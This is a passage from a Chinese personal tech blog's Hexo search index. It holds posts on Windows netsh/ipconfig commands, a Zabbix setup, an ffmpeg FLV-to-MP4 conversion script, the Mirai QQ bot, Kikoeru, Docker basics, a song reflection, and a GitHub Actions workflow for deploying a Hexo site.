        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dos配置IP地址开启DHCP</title>
      <link href="/2022/04/27/dos-pei-zhi-ip-di-zhi-kai-qi-dhcp/"/>
      <url>/2022/04/27/dos-pei-zhi-ip-di-zhi-kai-qi-dhcp/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在研究AD域控所以顺便学点Dos命令</p><h2 id="打开CMD终端"><a href="#打开CMD终端" class="headerlink" title="打开CMD终端"></a>打开CMD终端</h2><p>Win+R,输入CMD</p><h2 id="查看本地网卡相关信息"><a href="#查看本地网卡相关信息" class="headerlink" title="查看本地网卡相关信息"></a>查看本地网卡相关信息</h2><figure class="highlight dos"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">ipconfig</span><br></code></pre></td></tr></tbody></table></figure><h2 id="进入netsh设置"><a href="#进入netsh设置" class="headerlink" title="进入netsh设置"></a>进入netsh设置</h2><figure class="highlight ebnf"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">netsh</span><br></code></pre></td></tr></tbody></table></figure><h2 id="进入netsh-interface设置"><a href="#进入netsh-interface设置" class="headerlink" title="进入netsh interface设置"></a>进入netsh interface设置</h2><figure class="highlight actionscript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-class"><span class="hljs-keyword">interface</span></span><br></code></pre></td></tr></tbody></table></figure><h2 id="进入ipv4"><a href="#进入ipv4" class="headerlink" title="进入ipv4"></a>进入ipv4</h2><figure class="highlight smali"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">ipv4<br></code></pre></td></tr></tbody></table></figure><h2 id="设置网卡ip、子网掩码、网关"><a href="#设置网卡ip、子网掩码、网关" class="headerlink" title="设置网卡ip、子网掩码、网关"></a>设置网卡ip、子网掩码、网关</h2><figure class="highlight nginx"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">set</span> address <span class="hljs-string">"你自己的网卡名字"</span> static <span class="hljs-number">192.168.1.23</span> <span class="hljs-number">255.255.255.0</span> <span class="hljs-number">192.168.1.1</span><br></code></pre></td></tr></tbody></table></figure><h2 id="开启dhcp"><a href="#开启dhcp" class="headerlink" title="开启dhcp"></a>开启dhcp</h2><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">set</span><span class="hljs-built_in"> address </span><span class="hljs-string">"你自己的网卡名字"</span> <span class="hljs-attribute">source</span>=dhcp<br></code></pre></td></tr></tbody></table></figure><h2 id="使计算机将自己目前租用的IP地址交还给DHCP服务器（只在动态配置IP地址的机器上起作用）"><a href="#使计算机将自己目前租用的IP地址交还给DHCP服务器（只在动态配置IP地址的机器上起作用）" class="headerlink" title="使计算机将自己目前租用的IP地址交还给DHCP服务器（只在动态配置IP地址的机器上起作用）"></a>使计算机将自己目前租用的IP地址交还给DHCP服务器（只在动态配置IP地址的机器上起作用）</h2><figure class="highlight arduino"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">ipconfig/release<br></code></pre></td></tr></tbody></table></figure><h2 id="向DHCP服务器申请新的IP地址，与上条命令一起使用（只在动态配置IP地址的机器上起作用）"><a href="#向DHCP服务器申请新的IP地址，与上条命令一起使用（只在动态配置IP地址的机器上起作用）" class="headerlink" title="向DHCP服务器申请新的IP地址，与上条命令一起使用（只在动态配置IP地址的机器上起作用）"></a>向DHCP服务器申请新的IP地址，与上条命令一起使用（只在动态配置IP地址的机器上起作用）</h2><figure class="highlight dos"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">ipconfig</span>/renew<br></code></pre></td></tr></tbody></table></figure><h2 id="显示DNS客户解析器缓存的内容，包括从本地主机文件预装载的记录以及由域名解析服务器解析的所有资源记录"><a href="#显示DNS客户解析器缓存的内容，包括从本地主机文件预装载的记录以及由域名解析服务器解析的所有资源记录" class="headerlink" title="显示DNS客户解析器缓存的内容，包括从本地主机文件预装载的记录以及由域名解析服务器解析的所有资源记录"></a>显示DNS客户解析器缓存的内容，包括从本地主机文件预装载的记录以及由域名解析服务器解析的所有资源记录</h2><figure class="highlight dos"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">ipconfig</span>/displaydns<br></code></pre></td></tr></tbody></table></figure><h2 id="清理并重设DNS客户解析器缓存的内容"><a href="#清理并重设DNS客户解析器缓存的内容" class="headerlink" title="清理并重设DNS客户解析器缓存的内容"></a>清理并重设DNS客户解析器缓存的内容</h2><figure class="highlight dos"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">ipconfig</span>/flushdns<br></code></pre></td></tr></tbody></table></figure><h2 id="初始化网络适配器上配置的DNS和IP地址，可用于解决客户和DNS服务器之间的动态更新问题，而不必重新启动计算机"><a href="#初始化网络适配器上配置的DNS和IP地址，可用于解决客户和DNS服务器之间的动态更新问题，而不必重新启动计算机" class="headerlink" title="初始化网络适配器上配置的DNS和IP地址，可用于解决客户和DNS服务器之间的动态更新问题，而不必重新启动计算机"></a>初始化网络适配器上配置的DNS和IP地址，可用于解决客户和DNS服务器之间的动态更新问题，而不必重新启动计算机</h2><figure class="highlight dos"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">ipconfig</span>/registerdns<br></code></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> 服务器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Dos </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zabbix监控面板部署</title>
      <link href="/2022/03/17/zabbix-yun-wei-mian-ban-bu-shu/"/>
      <url>/2022/03/17/zabbix-yun-wei-mian-ban-bu-shu/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>看见很多运维佬用起了zabbix，好奇起来我也装个看看，看起来还不错的样子。</p><h2 id="准备事项"><a href="#准备事项" class="headerlink" title="准备事项"></a>准备事项</h2><p>一台电脑<br>linux ubuntu</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>根据官网的部署说明安装就可以了<br><a href="https://www.zabbix.com/cn/download?zabbix=6.0&amp;os_distribution=ubuntu&amp;os_version=20.04_focal&amp;db=mysql&amp;ws=apache">官网下载页面</a></p><h2 id="温馨提示"><a href="#温馨提示" class="headerlink" title="温馨提示"></a>温馨提示</h2><p>在创建密码那个步骤记住分清秘密，以免web界面连接数据库的时候输错导致无法连接数据库</p><h2 id="使用到的其他sql语句"><a href="#使用到的其他sql语句" class="headerlink" title="使用到的其他sql语句"></a>使用到的其他sql语句</h2><p>select user from mysql.user; #查询全部用户<br>drop database zabbix; #删除数据库<br>drop user ‘zabbix‘@’localhost’; #删除用户</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>安装不难，界面还挺好看的，如果电脑非常多例如几百台用这个还是挺不错的选择，就是我目前没对应环境，导致很多功能我不能体验……….</p>]]></content>
      
      
      <categories>
          
          <category> 服务器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> zabbix </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux之flv转mp4</title>
      <link href="/2022/03/10/linux-zhi-flv-zhuan-mp4/"/>
      <url>/2022/03/10/linux-zhi-flv-zhuan-mp4/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>为了让我的录播机能在线播放，所以找了个脚本，这个脚本是群里面一位大佬发出来的，非常感谢这位大佬的脚本。</p><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>提前安装好ffmpeg</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo .<span class="hljs-regexp">/脚本 "文件夹路径/</span>*.flv<span class="hljs-string">"</span><br></code></pre></td></tr></tbody></table></figure><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br><span class="hljs-comment"># 用法：</span><br><span class="hljs-comment"># ./convert.sh "/path/to/*.flv"</span><br><span class="hljs-comment"># </span><br><span class="hljs-comment"># 可选通过环境变量传入 FFMPEG 路径：</span><br><span class="hljs-comment"># FFMPEG="/path/to/ffmpeg" ./convert.sh "/path/to/*.flv"</span><br><br><span class="hljs-comment"># 颜色</span><br>RED=<span class="hljs-string">'\033[0;31m'</span><br>YELLOW=<span class="hljs-string">'\033[1;33m'</span><br>GREEN=<span class="hljs-string">'\033[0;32m'</span><br>NC=<span class="hljs-string">'\033[0m'</span><br><br><span class="hljs-comment"># 检查传入的参数</span><br><span class="hljs-comment"># 如果传入参数小于 1 个</span><br><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$#</span> -lt 1 ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"<span class="hljs-variable">${RED}</span>Missing argument!<span class="hljs-variable">${NC}</span>"</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">"Usage example:"</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">"  ./convert.sh \"/path/to/*.flv\""</span><br>    <span class="hljs-built_in">exit</span><br><span class="hljs-keyword">elif</span> [ <span class="hljs-variable">$#</span> -gt 1 ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"<span class="hljs-variable">${RED}</span>Too much argument!<span class="hljs-variable">${NC}</span>"</span><br>    <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"<span class="hljs-variable">${YELLOW}</span>Note<span class="hljs-variable">${NC}</span>: Did you forget quotes?"</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">"Usage example:"</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">"  ./convert.sh \"/path/to/*.flv\""</span><br>    <span class="hljs-built_in">exit</span><br><span class="hljs-keyword">fi</span><br><br><span class="hljs-comment"># 匹配的文件名</span><br>SOURCE_PATTERN=<span class="hljs-string">"<span class="hljs-variable">$1</span>"</span><br><br><span class="hljs-comment"># 检查 FFMPEG 名字或路径</span><br><span class="hljs-keyword">if</span> [ -z <span class="hljs-string">"<span class="hljs-variable">${FFMPEG}</span>"</span> ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-comment"># 如果没有传入则设置默认为 ffmpeg</span><br>    FFMPEG=ffmpeg<br><span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"<span class="hljs-variable">${YELLOW}</span>[NOTE] Using custom ffmpeg path: \"<span class="hljs-variable">${FFMPEG}</span>\"<span class="hljs-variable">${NC}</span>"</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">""</span><br><span class="hljs-keyword">fi</span><br><br><span class="hljs-comment"># 在匹配到的每个文件里循环，文件名为 source</span><br><span class="hljs-keyword">for</span> <span class="hljs-built_in">source</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$SOURCE_PATTERN</span>; <span class="hljs-keyword">do</span><br>    <span class="hljs-comment"># 设置 target 为 source 去掉后缀名再加上 ".mp4"</span><br>    target=<span class="hljs-string">"<span class="hljs-variable">${source%.*}</span>.mp4"</span><br>    <span class="hljs-comment"># 如果 source 是一个存在的文件</span><br>    <span class="hljs-keyword">if</span> [ -f <span class="hljs-string">"<span class="hljs-variable">$source</span>"</span> ]; <span class="hljs-keyword">then</span><br>        <span class="hljs-comment"># 如果 target 存在</span><br>        <span class="hljs-keyword">if</span> [ -e <span class="hljs-string">"<span class="hljs-variable">$target</span>"</span> ]; <span class="hljs-keyword">then</span><br>            <span class="hljs-comment"># 输出文件已存在提示</span><br>            <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"<span class="hljs-variable">${YELLOW}</span>[SKIP]<span class="hljs-variable">${NC}</span> MP4 exist: <span class="hljs-variable">$target</span>"</span><br>        <span class="hljs-keyword">else</span><br>            <span class="hljs-comment"># 否则输出运行的提示</span><br>            <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"<span class="hljs-variable">${GREEN}</span>[RUN ]<span class="hljs-variable">${NC}</span> convert \"<span class="hljs-variable">$source</span>\" to \"<span class="hljs-variable">$target</span>\""</span><br>            <span class="hljs-comment"># 运行 FFMPEG</span><br>            <span class="hljs-variable">$FFMPEG</span> -hide_banner -nostats -loglevel warning -i <span class="hljs-string">"<span class="hljs-variable">$source</span>"</span> -c copy <span class="hljs-string">"<span class="hljs-variable">$target</span>"</span><br>        <span class="hljs-keyword">fi</span><br>    <span class="hljs-keyword">fi</span><br><span class="hljs-keyword">done</span><br></code></pre></td></tr></tbody></table></figure><p>如果出现“解释器错误：没有那个文件或目录”尝试运行以下命令</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">sed -<span class="hljs-selector-tag">i</span><span class="hljs-selector-class">.bak</span> <span class="hljs-string">'s/\r$//g'</span> zhuanma.sh<br></code></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> 服务器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我的第一个QQ机器人Mirai</title>
      <link href="/2021/11/21/wo-de-di-yi-ge-qq-ji-qi-ren-mirai/"/>
      <url>/2021/11/21/wo-de-di-yi-ge-qq-ji-qi-ren-mirai/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>因为目前我所在的录播组的需要，所以弄来试试看，而且我以前就想弄了，这次顺便完成以前的想法。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://github.com/mamoe/mirai">官网：https://github.com/mamoe/mirai</a></p><p><a href="https://github.com/mamoe/mirai/blob/dev/docs/UserManual.md">用户手册：https://github.com/mamoe/mirai/blob/dev/docs/UserManual.md</a></p><p><a href="https://mirai.mamoe.net/">论坛：https://mirai.mamoe.net/</a></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>前往 <a href="https://github.com/iTXTech/mcl-installer/releases">https://github.com/iTXTech/mcl-installer/releases</a> 选择对应操作系统和架构下载可执行文件</p><p>安装过程全部默认，直接回车并且确定自己网络稳定，否则在装mcl的时候会下载不到压缩包</p><p>完成后直接运行mcl.cmd就成功运行机器人了</p><h2 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h2><p>装完的机器人是没有实际功能的，可以去论坛<a href="https://mirai.mamoe.net/">https://mirai.mamoe.net/</a>里面找平且根据说明进行安装和使用</p><p>如果你有能力也可以自己进行开发插件官方有提供开发文档<a href="https://github.com/mamoe/mirai/blob/dev/docs/README.md">docs</a>，<a href="https://docs.mirai.mamoe.net/">docs.mirai.mamoe.net</a></p>]]></content>
      
      
      <categories>
          
          <category> 服务器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mirai </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kikoeru使用体验</title>
      <link href="/2021/09/11/kikoeru-shi-yong-ti-yan/"/>
      <url>/2021/09/11/kikoeru-shi-yong-ti-yan/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前一段看见Kikoeru这个程序，自己搭来试试能不能换了我的音声站。</p><h2 id="什么是Kikoeru"><a href="#什么是Kikoeru" class="headerlink" title="什么是Kikoeru"></a>什么是Kikoeru</h2><p>一个同人音声专用的音乐流媒体服务器程序</p><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>去这里下载自己对应系统版本程序<a href="https://github.com/kikoeru-project/kikoeru-express/releases">点击下载</a></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>简而言之，以下任选其一：</p><p>Windows用户下载kikoeru-win-x64-v0.6.2.zip，直接解压即可使用。无需安装node等<br>Mac OS用户下载kikoeru-darwin-x64-v0.6.2.zip，解压执行其中的kikoeru-express，并赋予其执行权限（可在命令行下chmod +x kikoeru-express），执行（./kikoeru-express）。遇到权限提示请选择允许<br>请使用Docker Hub上的muveex/kikoeru:v0.6.2，不再提供打包镜像。注：muveex/kikoeru-express与muveex/kikoeru内容相同<br>也可使用docker-compose。可自行编辑文件调整挂载位置，安装完后浏览器输入本机ip:8888进行访问</p><h2 id="使用体验"><a href="#使用体验" class="headerlink" title="使用体验"></a>使用体验</h2><p>pc端还不错，手机端就有点不太行了，经常显示错误，还想着换掉我现在的音声站，还是算了。</p>]]></content>
      
      
      <categories>
          
          <category> 服务器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kikoeru </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker基本概念</title>
      <link href="/2021/09/08/docker-ji-ben-gai-nian/"/>
      <url>/2021/09/08/docker-ji-ben-gai-nian/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这只是我对Docker的理解，更准确请参考官方说明。</p><h2 id="什么是Docker？"><a href="#什么是Docker？" class="headerlink" title="什么是Docker？"></a>什么是Docker？</h2><p>Docker是容器技术的代表，容器技术从本质上讲是将程序隔离、打包的技术。Docker解决了软件包装的问题，理顺了开发和运维的环境的差异，使得开发和运维能用同种语言来沟通。<br>类比：可以粗糙地理解为轻量级的虚拟机。它和虚拟机某种程度上完成同样的任务：就是把一个应用程序放在一个独立的环境里来运行。<br>Docker不是虚拟机！</p><h2 id="Docker基本概念"><a href="#Docker基本概念" class="headerlink" title="Docker基本概念"></a>Docker基本概念</h2><ul><li>镜像（Image）<ul><li>类似系统镜像，软件镜像，等等，这些镜像可以直接在下载或者上传。</li></ul></li><li>容器（Container）<ul><li>类似VM虚拟机那样，单一个虚拟机对应一个环境，不过这里就变成一个镜像对应一个容器，和其他容器互不干扰。</li></ul></li><li>仓库（Repository）<ul><li>就是一个储存中心，比如你有两台服务器分别为A和B那么A有一个名为S的镜像并且保存在存储中心里面，那么B想用这个名为S的镜像，那么直接去存储中心直接下载到本机就能使用了。</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 服务器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>水星记</title>
      <link href="/2021/08/29/shui-xing-ji/"/>
      <url>/2021/08/29/shui-xing-ji/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在网上听到水星记的日语版，顺便查了下这歌所表达的意思，实在太有感触了。</p><h2 id="关于水星记"><a href="#关于水星记" class="headerlink" title="关于水星记"></a>关于水星记</h2><p>《水星记》(Mercury Records)是由郭顶作词、作曲并演唱的歌曲，作为第二波抒情主打曲收录于郭顶2016年11月25日发行的专辑《飞行器的执行周期》中。<br>歌曲表达的是一种类似水星与太阳之间，永远围绕，咫尺距离，却永远无法靠近，但也甘愿如此陪伴的那种感情。<br><img src="https://iknow-pic.cdn.bcebos.com/b3fb43166d224f4aa0feec0d06f790529822d14d?x-bce-process=image/resize,m_lfit,w_600,h_800,limit_1/quality,q_85/format,f_jpg"></p><h2 id="感触"><a href="#感触" class="headerlink" title="感触"></a>感触</h2><p>以前小学，初中，高中，大学，身边会有很多朋友，到如今大家都已经出来工作了，各有各自的事情，联系方面也已经没有了，像极了歌曲所表达情感一样，我就像水星，曾经的朋友就像太阳，我们永远围绕，咫尺距离，却永远无法靠近，可能这就是所谓的成长吧。<br><img src="https://s3.bmp.ovh/imgs/2021/08/2842fd389706620c.png"></p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 怀念 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Actions自动部署Hexo博客</title>
      <link href="/2021/08/26/actions-zi-dong-bu-shu-hexo-bo-ke/"/>
      <url>/2021/08/26/actions-zi-dong-bu-shu-hexo-bo-ke/</url>
      
        <content type="html"><![CDATA[<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://sanonz.github.io/2020/deploy-a-hexo-blog-from-github-actions/">利用 Github Actions 自动部署 Hexo 博客</a><br><a href="https://fushaolei.github.io/post/github-action-hexo/">GitHub Action + Hexo 实现在线写作</a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>为了搭建HexoPlusPlus所以先部署了Actions.</p><h2 id="准备仓库"><a href="#准备仓库" class="headerlink" title="准备仓库"></a>准备仓库</h2><p>Source_code //放源代码文件scaffolds、source、themes、_config.yml、package.json、package-lock.json（删除.git）<br>limitationai.github.io  //放静态文件（也就是发布页）</p><h2 id="生成密钥-公钥"><a href="#生成密钥-公钥" class="headerlink" title="生成密钥,公钥"></a>生成密钥,公钥</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nano">#生成公钥,密钥<br>ssh-keygen -f github-deploy-key<br></code></pre></td></tr></tbody></table></figure><p>Windows生成后会在C:\Users\你的用户名.ssh文件夹里面有两个文件分别是公钥github_rsa.pub和密钥github_rsa。</p><h2 id="配置密钥"><a href="#配置密钥" class="headerlink" title="配置密钥"></a>配置密钥</h2><p>复制 github-deploy-key 文件内容，在放源码的Source_code仓库 Settings -&gt; Secrets -&gt; Add a new secret 页面上添加。<br><a href="https://imgtu.com/i/hJUDtP"><img src="https://z3.ax1x.com/2021/08/30/hJUDtP.png" alt="hJUDtP.png"></a></p><h2 id="配置公钥"><a href="#配置公钥" class="headerlink" title="配置公钥"></a>配置公钥</h2><p>复制 github-deploy-key.pub 文件内容，在 limitationai.github.io 仓库 Settings -&gt; Deploy keys -&gt; Add deploy key 页面上添加。<br><a href="https://imgtu.com/i/hJUyp8"><img src="https://z3.ax1x.com/2021/08/30/hJUyp8.png" alt="hJUyp8.png"></a></p><h2 id="添加Actions"><a href="#添加Actions" class="headerlink" title="添加Actions"></a>添加Actions</h2><p><img src="https://img-blog.csdnimg.cn/img_convert/9251030838ea8bb3ad2e16af71e08271.png"><br>将以下的代码复制粘贴，并且根据自身情况修改</p><figure class="highlight yml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-attr">name:</span> <span class="hljs-string">自動部署</span> <span class="hljs-string">Hexo</span><br><br><span class="hljs-attr">on:</span><br>  <span class="hljs-attr">push:</span><br>    <span class="hljs-attr">branches:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">main</span><br><br><span class="hljs-attr">jobs:</span><br>  <span class="hljs-attr">build:</span><br>    <span class="hljs-attr">runs-on:</span> <span class="hljs-string">ubuntu-latest</span><br>    <span class="hljs-attr">strategy:</span><br>      <span class="hljs-attr">matrix:</span><br>        <span class="hljs-attr">node-version:</span> [<span class="hljs-number">12.</span><span class="hljs-string">x</span>]<br><br>    <span class="hljs-attr">steps:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">开始运行</span><br>        <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/checkout@v1</span><br><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">设置</span> <span class="hljs-string">Node.js</span> <span class="hljs-string">${{</span> <span class="hljs-string">matrix.node-version</span> <span class="hljs-string">}}</span><br>        <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/setup-node@v1</span><br>        <span class="hljs-attr">with:</span><br>          <span class="hljs-attr">node-version:</span> <span class="hljs-string">${{</span> <span class="hljs-string">matrix.node-version</span> <span class="hljs-string">}}</span><br><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">配置</span> <span class="hljs-string">Git</span> <span class="hljs-string">环境</span><br>        <span class="hljs-attr">env:</span><br>          <span class="hljs-attr">ACTION_DEPLOY_KEY:</span> <span class="hljs-string">${{secrets.HEXO_DEPLOY_PRIVATE_KEY}}</span><br>        <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br><span class="hljs-string">          mkdir -p ~/.ssh/</span><br><span class="hljs-string">          echo "$ACTION_DEPLOY_KEY" &gt; ~/.ssh/id_rsa</span><br><span class="hljs-string">          chmod 600 ~/.ssh/id_rsa</span><br><span class="hljs-string">          ssh-keyscan github.com &gt;&gt; ~/.ssh/known_hosts</span><br><span class="hljs-string">          git config --global user.name "limitationai"</span><br><span class="hljs-string">          git config --global user.email "limitationai@gmail.com"</span><br><span class="hljs-string"></span>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">安装</span> <span class="hljs-string">Hexo</span> <span class="hljs-string">CI</span><br>        <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br><span class="hljs-string">          export TZ='Asia/Shanghai'</span><br><span class="hljs-string">          npm i -g hexo-cli</span><br><span class="hljs-string">          npm i</span><br><span class="hljs-string"></span>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">安装插件</span><br>        <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br><span class="hljs-string">          npm install hexo-renderer-pug --save</span><br><span class="hljs-string">          npm install hexo-renderer-stylus --save</span><br><span class="hljs-string">          npm install hexo-deployer-git --save</span><br><span class="hljs-string">          npm install hexo-generator-search --save</span><br><span class="hljs-string">          npm install hexo-douban --save</span><br><span class="hljs-string">          npm install hexo-generator-feed --save</span><br><span class="hljs-string">          npm install hexo-abbrlink --save</span><br><span class="hljs-string">          npm install hexo-wordcount --save</span><br><span class="hljs-string"></span>      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">部署博客</span><br>        <span class="hljs-attr">run:</span> <span class="hljs-string">|</span><br><span class="hljs-string">          rm -rf .deploy_git</span><br><span class="hljs-string">          hexo g &amp;&amp; hexo douban &amp;&amp; hexo deploy</span><br><span class="hljs-string">          rm ~/.ssh/id_rsa</span><br></code></pre></td></tr></tbody></table></figure><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>最后去github个人仓库界面看见有橙色的小圆点就代表部署成功了</p>]]></content>
      
      
      <categories>
          
          <category> 服务器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Actions </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
